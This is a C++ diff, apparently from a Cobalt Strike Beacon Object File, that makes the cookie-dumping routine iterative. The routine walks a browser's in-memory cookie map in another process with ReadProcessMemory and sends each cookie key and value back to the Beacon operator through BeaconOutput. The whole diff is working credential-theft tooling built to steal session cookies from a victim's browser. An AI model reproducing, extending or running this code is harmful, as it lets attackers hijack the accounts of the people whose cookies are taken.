@@ -450,7 +450,99 @@ void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, TargetVersion target
     }
 
 }
+// stack struct for enum
+struct StackNode {
+    Node node;
+    struct StackNode* next;
+};
 
+// create stack
+struct StackNode* createStackNode(const Node& node) {
+    struct StackNode* stackNode = (struct StackNode*)malloc(sizeof(struct StackNode));
+    if (stackNode) {
+        stackNode->node = node;
+        stackNode->next = NULL;
+    }
+    return stackNode;
+}
+
+void push(struct StackNode** top, const Node& node) {
+    struct StackNode* newNode = createStackNode(node);
+    if (newNode) {
+        newNode->next = *top;
+        *top = newNode;
+    }
+}
+
+bool isEmpty(struct StackNode* top) {
+    return top == NULL;
+}
+
+Node pop(struct StackNode** top) {
+    if (isEmpty(*top)) {
+        return Node(); // none
+    }
+    
+    struct StackNode* temp = *top;
+    Node node = temp->node;
+    *top = (*top)->next;
+    free(temp);
+    return node;
+}
+
+void cleanupStack(struct StackNode** top) {
+    while (!isEmpty(*top)) {
+        pop(top);
+    }
+}
+
+// ProcessNode without Recursion 
+void ProcessNode(HANDLE hProcess, const Node& rootNode, TargetVersion targetConfig, formatp* buffer, int* bufsize) {
+    struct StackNode* stack = NULL;
+    push(&stack, rootNode);
+    
+    while (!isEmpty(stack)) {
+        Node currentNode = pop(&stack);
+        
+        // Process the current node
+        BeaconFormatReset(buffer);
+        BeaconFormatPrintf(buffer, "Cookie Key: ");
+        ReadString(hProcess, currentNode.key, buffer);
+
+#ifdef _DEBUG
+        PRINT("Attempting to read cookie values from address:  0x%p\n", (void*)currentNode.valueAddress);
+#endif
+        ProcessNodeValue(hProcess, currentNode.valueAddress, targetConfig, buffer);
+        BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(buffer, bufsize), *bufsize);
+
+        // push stack
+        if (currentNode.right != 0) {
+            Node rightNode;
+            if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(currentNode.right), 
+                                &rightNode, sizeof(Node), nullptr)) {
+                push(&stack, rightNode);
+            }
+            else {
+                PrintErrorWithMessage(TEXT("Error reading right node"));
+            }
+        }
+
+        if (currentNode.left != 0) {
+            Node leftNode;
+            if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(currentNode.left), 
+                                &leftNode, sizeof(Node), nullptr)) {
+                push(&stack, leftNode);
+            }
+            else {
+                PrintErrorWithMessage(TEXT("Error reading left node"));
+            }
+        }
+    }
+    
+    // clean up
+    cleanupStack(&stack);
+}
+#if 0
 void ProcessNode(HANDLE hProcess, const Node& node, TargetVersion targetConfig, formatp* buffer, int* bufsize) {
     // Process the current node
     BeaconFormatReset(buffer);
@@ -481,6 +573,7 @@ void ProcessNode(HANDLE hProcess, const Node& node, TargetVersion targetConfig, 
             PrintErrorWithMessage(TEXT("Error reading right node"));
     }
 }
+#endif 
 
 void WalkCookieMap(HANDLE hProcess, uintptr_t cookieMapAddress, TargetVersion targetConfig) {
 
